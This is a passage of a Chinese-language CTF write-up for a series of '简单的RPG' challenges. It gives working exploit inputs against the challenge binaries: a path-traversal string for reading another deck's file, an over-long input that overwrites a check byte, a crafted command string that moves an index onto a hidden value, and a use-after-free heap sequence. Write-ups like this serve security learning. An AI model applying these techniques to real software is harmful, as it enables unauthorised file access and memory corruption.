class="hljs-string">&quot;./easyrpg/opp_deck/Stardust_Dragon.card&quot;</span>, <span class="hljs-number">0</span>);<br>    read(fd, &amp;buf, <span class="hljs-number">2uLL</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Stardust_Dragon:%d\n&quot;</span>,buf);<br><br>    fd = open(<span class="hljs-string">&quot;./easyrpg/your_deck/Ash_Blossom.card&quot;</span>, <span class="hljs-number">0</span>);<br>    read(fd, &amp;buf, <span class="hljs-number">2uLL</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Ash_Blossom:%d\n&quot;</span>,buf);<br><br>    fd = open(<span class="hljs-string">&quot;./easyrpg/your_deck/Ghost_Belle.card&quot;</span>, <span class="hljs-number">0</span>);<br>    read(fd, &amp;buf, <span class="hljs-number">2uLL</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Ghost_Belle:%d\n&quot;</span>,buf);<br><br>    fd = open(<span class="hljs-string">&quot;./easyrpg/your_deck/Ghost_Ogre.card&quot;</span>, <span class="hljs-number">0</span>);<br>    read(fd, &amp;buf, <span class="hljs-number">2uLL</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Ghost_Ogre:%d\n&quot;</span>,buf);<br> <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<p><img src="/posts/764dc2d/image-20230226155223114.png" srcset="/img/loading.gif" lazyload alt="image-20230226155223114"></p>
<p>于是就想着该怎么样才可以读取opp_deck文件里面的内容</p>
<p>其实题目已经给了提示了，“…/”正好可以进入上一文件夹。</p>
<p><img src="/posts/764dc2d/image-20230226155944730.png" srcset="/img/loading.gif" lazyload alt="image-20230226155944730"></p>
<p>不过这里的代码逻辑看了半天没看明白，索性直接开gdb调试看一下，我随便输入了一个带…/的路径进去尝试了一下。</p>
<p>比如your_deck/Ash_Blossom/…/opp_deck/Dragonmaid_Strahl</p>
<p>调试以后代码功能就很清晰了：</p>
<ul>
<li>首先会将s1也就是我们输入的字符串赋值给dest指针，此时dest指向s1字符串的开始,此时这两个字符串如下
<ul>
<li>s1=your_deck/Ash_Blossom/…/opp_deck/Dragonmaid_Strahl</li>
<li>dest=your_deck/Ash_Blossom/…/opp_deck/Dragonmaid_Strahl</li>
</ul>
</li>
<li>然后strstr会寻找字符串中&quot;…/&quot;，并返回&quot;…/&quot;的起始位置，如果没找到则返回0，所以此时这两个字符串如下：
<ul>
<li>s1=your_deck/Ash_Blossom/…/opp_deck/Dragonmaid_Strahl</li>
<li>dest=…/opp_deck/Dragonmaid_Strahl</li>
</ul>
</li>
<li>然后将dest+1赋值给dest
<ul>
<li>s1=your_deck/Ash_Blossom/./opp_deck/Dragonmaid_Strahl</li>
<li>./opp_deck/Dragonmaid_Strahl</li>
</ul>
</li>
<li>可以看到dest改变后，s1也发生了改变。然后如果后续没有…/那么就会退出。</li>
</ul>
<p>这样思路就来了，我们只需要输入your_deck/…/opp_deck/Dragonmaid_Strahl，那经过一次这个函数，就正好变成了your_deck/…/opp_deck/Dragonmaid_Strahl，可以读取3500战斗力的角色卡了。</p>
<h3 id="简单的rpg5"><a class="markdownIt-Anchor" href="#简单的rpg5"></a> 简单的RPG5</h3>
<p>一开始被卡了很久，看到是个迷宫，然后网上找了个走迷宫代码，随便改改兴冲冲的去试了下，结果没跑通，又手画了一下，发现这个人被围在了一个围墙里面，怎么都走不出去。</p>
<p>看提示是，这一侧走不过去，难道要从另一侧走？</p>
<p>仔细研究以后，发现了如下问题：</p>
<p><strong>scanf读取的特性：</strong></p>
<p>在读取了指定的512个字符后，会在之后再加一个&quot;\0&quot;</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">__isoc99_scanf(<span class="hljs-string">&quot;%512s&quot;</span>, byte_40C0);<br></code></pre></div></td></tr></table></figure>
<p>也就说一旦我们输入超过512个字符，原来那个内存中数组里面第512个数据将会被覆盖成&quot;\0&quot;</p>
<p>而我们从getbit可以知道，当a2=0,0&lt;=a1&lt;=7时，都会取到这第512位，此时，这一位已经变成了&quot;\0&quot;，就可以通过判断</p>
<p><img src="/posts/764dc2d/image-20230306110641863.png" srcset="/img/loading.gif" lazyload alt="image-20230306110641863"></p>
<p>如图，我们调试一下就会发现，输入超过512字符后，字符数组第512位被覆盖了</p>
<p><img src="/posts/764dc2d/image-20230306094847390.png" srcset="/img/loading.gif" lazyload alt="image-20230306094847390"></p>
<p>所以我们可以先走WDDDDDDS这几步，走到(1,7)的位置，</p>
<p>然后再将起点设置为(1,7)，跑一下下面的代码，把后面的步骤跑出来</p>
<figure class="highlight ebnf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ebnf"><span class="hljs-attribute">DDDDDDDDSSDDDDWWDDSSSSAASSSSDDSSDDWWDDWWAAWWDDDDWWDDWWDDDDDDDDSSSSSSDDSSSSAASSSSDDSSSSSSAAAAAAAAAAAAAASSSSSSSSSSAAAAAASSSSSSSSDDSSSSAASSSSDDSSDDDDDDDDDDDDDDWWDDDDDDDDSSDDDDDDWWDDDDDDSSDDDDDDDDWWWWDDDDSSDDSSDDDDWWWWWWWWDDDDSSDDSSSSSSDDDDWWDDDDDDDDDDDDDDSSDD</span><br></code></pre></div></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;queue&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fstream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-keyword">int</span> n = <span class="hljs-number">50</span>, m = <span class="hljs-number">100</span>;<br><span class="hljs-keyword">bool</span> vis[<span class="hljs-number">51</span>][<span class="hljs-number">101</span>];<br><span class="hljs-keyword">int</span> mv[<span class="hljs-number">4</span>][<span class="hljs-number">2</span>] = &#123;&#123;<span class="hljs-number">1</span>, <span class="hljs-number">0</span>&#125;, &#123;<span class="hljs-number">0</span>, <span class="hljs-number">1</span>&#125;, &#123;<span class="hljs-number">0</span>, <span class="hljs-number">-1</span>&#125;, &#123;<span class="hljs-number">-1</span>, <span class="hljs-number">0</span>&#125;&#125;; <span class="hljs-comment">// D R L U 字典序</span><br><span class="hljs-built_in">string</span> Map[<span class="hljs-number">51</span>];<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">int</span> x;<br>    <span class="hljs-keyword">int</span> y;<br>    <span class="hljs-keyword">int</span> step;<br>    <span class="hljs-built_in">string</span> str;<br>    Node(<span class="hljs-keyword">int</span> _x, <span class="hljs-keyword">int</span> _y, <span class="hljs-keyword">int</span> _step, <span class="hljs-built_in">string</span> _str)<br>    &#123;<br>        x = _x;<br>        y = _y;<br>        step = _step;<br>        str = _str;<br>    &#125;<br>&#125;;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">duqu</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    ifstream ifs;<br>    ifs.open(<span class="hljs-string">&quot;map.txt&quot;</span>, ios::in);<br>    <span class="hljs-keyword">if</span> (!ifs.is_open())<br>    &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;文件打开失败！！！&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-built_in">string</span> buf;<br>    <span class="hljs-keyword">int</span> x = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (getline(ifs, buf))<br>    &#123;<br>        Map[x] = buf;<br>        x++;<br>    &#125;<br>    ifs.close();<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">pmap</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>    &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; Map[i] &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    &#125;<br>    <br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    duqu();<br>    <span class="hljs-built_in">queue</span>&lt;Node&gt; q;<br>    <span class="hljs-built_in">string</span> s = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-built_in">string</span> path=<span class="hljs-string">&quot;&quot;</span>;<br>    vis[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] = <span class="hljs-literal">true</span>;<br>    q.push(Node(<span class="hljs-number">1</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&quot;&quot;</span>));<br>    <span class="hljs-keyword">while</span> (!q.empty())<br>    &#123;<br>        Node now = q.front();<br>        q.pop();<br>        <span class="hljs-keyword">if</span> (now.x == n - <span class="hljs-number">1</span> &amp;&amp; now.y == m - <span class="hljs-number">1</span>)<br>        &#123;<br>            <span class="hljs-built_in">cout</span> &lt;&lt; now.step &lt;&lt; <span class="hljs-built_in">endl</span>;<br>            <span class="hljs-built_in">cout</span> &lt;&lt; now.str &lt;&lt; <span class="hljs-built_in">endl</span>;<br>            path=now.str;<br>        &#125;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>        &#123;<br>            <span class="hljs-keyword">int</span> tx = now.x + mv[i][<span class="hljs-number">0</span>];<br>            <span class="hljs-keyword">int</span> ty = now.y + mv[i][<span class="hljs-number">1</span>];<br>            <span class="hljs-keyword">if</span> (tx &gt;= <span class="hljs-number">0</span> &amp;&amp; tx &lt; n &amp;&amp; ty &gt;= <span class="hljs-number">0</span> &amp;&amp; ty &lt; m &amp;&amp; !vis[tx][ty] &amp;&amp; Map[tx][ty] == <span class="hljs-string">&#x27; &#x27;</span>)<br>            &#123;<br>                <span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span>)<br>                &#123;<br>                    s = <span class="hljs-string">&quot;S&quot;</span>;<br>                &#125;<br>                <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (i == <span class="hljs-number">1</span>)<br>                &#123;<br>                    s = <span class="hljs-string">&quot;D&quot;</span>;<br>                &#125;<br>                <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (i == <span class="hljs-number">2</span>)<br>                &#123;<br>                    s = <span class="hljs-string">&quot;A&quot;</span>;<br>                &#125;<br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                    s = <span class="hljs-string">&quot;W&quot;</span>;<br>                &#125;<br>                vis[tx][ty] = <span class="hljs-literal">true</span>;<br>                q.push(Node(tx, ty, now.step + <span class="hljs-number">1</span>, now.str + s));<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">int</span> x=<span class="hljs-number">7</span>,y=<span class="hljs-number">1</span>;<br>    Map[<span class="hljs-number">1</span>][<span class="hljs-number">7</span>]=<span class="hljs-string">&#x27;-&#x27;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; path.length(); i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (path[i] == <span class="hljs-string">&#x27;D&#x27;</span>)<br>        &#123;<br>            x++;<br>            Map[y][x]=<span class="hljs-string">&#x27;-&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (path[i] == <span class="hljs-string">&#x27;A&#x27;</span>)<br>        &#123;<br>            x--;<br>            Map[y][x]=<span class="hljs-string">&#x27;-&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (path[i] == <span class="hljs-string">&#x27;W&#x27;</span>)<br>        &#123;<br>            y--;<br>            Map[y][x]=<span class="hljs-string">&#x27;|&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(path[i]==<span class="hljs-string">&#x27;S&#x27;</span>)<br>        &#123;<br>            y++;<br>            Map[y][x]=<span class="hljs-string">&#x27;|&#x27;</span>;<br>        &#125;<br>    &#125;<br>    pmap();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></div></td></tr></table></figure>
<p>总的路径如下，不够512的位随便填充一下就好</p>
<figure class="highlight ebnf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ebnf"><span class="hljs-attribute">WDDDDDDSDDDDDDDDSSDDDDWWDDSSSSAASSSSDDSSDDWWDDWWAAWWDDDDWWDDWWDDDDDDDDSSSSSSDDSSSSAASSSSDDSSSSSSAAAAAAAAAAAAAASSSSSSSSSSAAAAAASSSSSSSSDDSSSSAASSSSDDSSDDDDDDDDDDDDDDWWDDDDDDDDSSDDDDDDWWDDDDDDSSDDDDDDDDWWWWDDDDSSDDSSDDDDWWWWWWWWDDDDSSDDSSSSSSDDDDWWDDDDDDDDDDDDDDSSDDWDDDDDDDSDDDDDDDDSSDDDDWWDDSSSSAASSSSDDSSDDWWDDWWAAWWDDDDWWDDWWDDDDDDDDSSSSSSDDSSSSAASSSSDDSSSSSSAAAAAAAAAAAAAASSSSSSSSSSAAAAAASSSSSSSSDDSSSSAASSSSDDSSDDDDDDDDDDDDDDWWDDDDDDDDSSDDDDDDWWDDDDDDSSDDDDDDDDWWWWDDDDSSDDSSDDDDWWWWWWWWDDDDSSDDSSSSSSDDDDWWDDDDDDDDDDDDDDSSDD</span><br></code></pre></div></td></tr></table></figure>
<h3 id="简单的rpg6"><a class="markdownIt-Anchor" href="#简单的rpg6"></a> 简单的RPG6</h3>
<p>这题IDA逆向的很奇怪，if嵌套很多，逆向了半天，后来发现不如直接看汇编，汇编语句很清晰的表达出了程序逻辑</p>
<p>主体逻辑逆向如下，变量自己命名了一下。</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-keyword">char</span> ran_l;<span class="hljs-comment">//每一回合要判断的八位随机数</span><br><span class="hljs-keyword">char</span> record[<span class="hljs-number">128</span>];<span class="hljs-comment">//我们可以操作的数组</span><br><span class="hljs-keyword">char</span> buf[<span class="hljs-number">64</span>];<span class="hljs-comment">//存储命令的数组</span><br><span class="hljs-keyword">int</span> flag;<span class="hljs-comment">//输入.flag就会置为1，这个标志相当于结束while循环，意味着我们这一回合已经操作完毕，可以进行判断了</span><br><span class="hljs-keyword">int8_t</span> ri;<span class="hljs-comment">//record的索引</span><br><span class="hljs-keyword">int</span> boundary;<span class="hljs-comment">//循环次数，用来判断命令是否产生循环</span><br><span class="hljs-keyword">int</span> index;<span class="hljs-comment">//buf索引</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> ran;<br>    <span class="hljs-keyword">int</span> length;<br>    <span class="hljs-keyword">int</span> spell;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">3</span>; i++)<br>    &#123;<br>        ran_l = ran &gt;&gt; (<span class="hljs-number">8</span> * i);<br>        <span class="hljs-built_in">memset</span>(record, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(record));<br>        boundary = <span class="hljs-number">0</span>;<br>        flag = <span class="hljs-number">0</span>;<br>        index = <span class="hljs-number">0</span>;<br>        ri = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> (index &lt; length &amp;&amp; boundary &lt;= <span class="hljs-number">99999</span> &amp;&amp; !flag)<br>        &#123;<br>            spell = buf[index];<br>            <span class="hljs-keyword">switch</span> (spell)<br>            &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;+&#x27;</span>:<br>                ++record[ri];<br><br>                <span class="hljs-keyword">break</span>;<br><br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;-&#x27;</span>:<br>                --record[ri];<br><br>                <span class="hljs-keyword">break</span>;<br><br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;.&#x27;</span>:<br>                flag = <span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">break</span>;<br><br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;&lt;&#x27;</span>:<br>                <span class="hljs-keyword">if</span> (ri)<span class="hljs-comment">//不等于0</span><br>                    --ri;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;&gt;&#x27;</span>:<br>                <span class="hljs-keyword">if</span> (ri &amp; <span class="hljs-number">0x80</span> == <span class="hljs-number">0</span>)<span class="hljs-comment">// 最高位不等于1</span><br>                &#123; <span class="hljs-comment">// 没到最右边</span><br>                    ++ri;<br>                &#125;<br>                <span class="hljs-keyword">break</span>; <br><br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;[&#x27;</span>:<br>                <span class="hljs-keyword">if</span> (!record[ri])<br>                &#123;<br>                    <span class="hljs-keyword">int</span> v8 = <span class="hljs-number">1</span>;<br>                    <span class="hljs-keyword">while</span> (v8)<br>                    &#123;<br>                        <span class="hljs-keyword">if</span> (buf[++index] == <span class="hljs-string">&#x27;[&#x27;</span>)<br>                            ++v8;<br>                        <span class="hljs-keyword">if</span> (buf[index] == <span class="hljs-string">&#x27;]&#x27;</span>)<br>                            --v8;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;]&#x27;</span>:<br>                <span class="hljs-keyword">if</span> (record[ri])<br>                &#123;<br>                    <span class="hljs-keyword">int</span> v9 = <span class="hljs-number">1</span>;<br>                    <span class="hljs-keyword">while</span> (v9)<br>                    &#123;<br>                        <span class="hljs-keyword">if</span> (buf[--index] == <span class="hljs-string">&#x27;[&#x27;</span>)<br>                            --v9;<br>                        <span class="hljs-keyword">if</span> (buf[index] == <span class="hljs-string">&#x27;]&#x27;</span>)<br>                            ++v9;<br>                    &#125;<br>                &#125;<br><br>                <span class="hljs-keyword">break</span>;<br><br>            <span class="hljs-keyword">default</span>:<br>                flag = <span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            ++index;<br>            ++boundary;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (boundary == <span class="hljs-number">100000</span>)<br>        &#123;<br>            <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;bad end&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!flag || record[ri] != ran &gt;&gt; (<span class="hljs-number">8</span> * i))<br>        &#123;<br>            <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;bad end&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;flag&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>翻译了整个程序逻辑后，就可以发现意思其实很简单，就是我们可以输入六个字符：±&gt;&lt;[]。</p>
<p>±用来使得当前record[ri]加一或减一</p>
<p>&lt;&gt;用来操作record的索引ri，其实加一或减一</p>
<p>[]我觉得这个命令的含义最为关键，也较为难理解，它可以实现循环，概括一下就是两种情况：</p>
<ul>
<li>record[ri]==0时：
<ul>
<li>[ ：遇到该字符就会直接运行到和其对应的]字符处，并忽略中间的字符。</li>
<li>] ：遇到该字符直接跳过</li>
</ul>
</li>
<li>recored!=0时：
<ul>
<li>[ ：遇到该字符直接跳过</li>
<li>] ：遇到]的时候，index就会回退到[的位置，重新执行[]里面的命令。</li>
</ul>
</li>
</ul>
<p>而理解这些命令，我们再来看栈帧结构</p>
<p><img src="/posts/764dc2d/1E1F18D0676307B12CA4A7BA4B7AC3D1.png" srcset="/img/loading.gif" lazyload alt="1E1F18D0676307B12CA4A7BA4B7AC3D1"></p>
<p>其中recored占128个字节，ri占1字节，ran_l占1字节。</p>
<p>这些都想清楚后，其实也就明白了目标就是移动ri指向ran_l，从而通过判断</p>
<p>所以经过尝试后，每一回合执行如下的操作就可以使得ri指向ran_l，完成移动后我们就可以输入.来结束命令</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">+[+&gt;-]&gt;+.<br></code></pre></div></td></tr></table></figure>
<p>因为有四个回合，所以重复四次，这就是我们最终可以获取flag的命令</p>
<figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh">+[+&gt;-]&gt;+.+[+&gt;-]&gt;+.+[+&gt;-]&gt;+.+[+&gt;-]&gt;+.<br></code></pre></div></td></tr></table></figure>
<h3 id="简单的rpg7"><a class="markdownIt-Anchor" href="#简单的rpg7"></a> 简单的RPG7</h3>
<p>主要是use after free</p>
<p>学习链接：<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/use-after-free/">Use After Free - CTF Wiki (ctf-wiki.org)</a></p>
<p>可以看到magic释放后没有置为0,所以存在use after free问题。</p>
<p><img src="/posts/764dc2d/image-20230306182232611.png" srcset="/img/loading.gif" lazyload alt="image-20230306182232611"></p>
<p>而对brick我们可以看到，只要内存中第二个八字节里面的内容为1，–1就会变成0，然后我们就可以在跳出while循环，拿到flag</p>
<p><img src="/posts/764dc2d/image-20230306182336686.png" srcset="/img/loading.gif" lazyload alt="image-20230306182336686"></p>
<p>生命值有140000，而我们每操作一次，生命值-30000，所以最多只有五次机会，只要我们在第五次跳出循环，就可以跳过最后一次对生命值的判断。</p>
<p>所以执行的思路如下：</p>
<ul>
<li>
<p>第一次：选择2，魔力值为56，因为brick申请了72字节内存空间，而magic申请的内存空间为我们输入的值+16，所以要使我们释放了magic后brick申请的内存正好是magic之前使用的的话，就需要申请56+16=72字节空间</p>
</li>
<li>
<p>第二次：选择2，释放magic</p>
</li>
<li>
<p>第三次：选择3，再次申请到magic使用过的内存空间，并将其标记为in use</p>
</li>
<li>
<p>第四次：选择2，因为在上一步我们已经标记了内存空间为in use，所以我们这一步是再次将其释放</p>
</li>
<li>
<p>第五次：选择2，这次我们输入41，再次申请到原来使用过的空间。输入41的原因如下：</p>
<ul>
<li>
<p><img src="/posts/764dc2d/image-20230306183211269.png" srcset="/img/loading.gif" lazyload alt="image-20230306183211269"></p>
</li>
<li>
<p>刚开始的时候这个地方想了很久，这里第二个八字节的数是由我们第五步输入的数*25得到的，当时一直想着怎么样才可以输入一个数乘以25以后得到01，一直在往溢出方向去想，想了半天无果</p>
</li>
<li>
<p>后来仔细看了眼汇编，就发现了很奇特的事情：</p>
<p>这里的校验逻辑是先将该数减一，但是最后只取了低八位判断是否为0</p>
<p><img src="/posts/764dc2d/image-20230306183653974.png" srcset="/img/loading.gif" lazyload alt="image-20230306183653974"></p>
<p>所以我们只需要将这里的数设计为0x**01就可以了</p>
<p>相当于我们需要找到两个整数使得等式25x=256k+1成立</p>
<p>那么x=41,k=4显然是一个解。所以输入41即可</p>
</li>
</ul>
</li>
</ul>
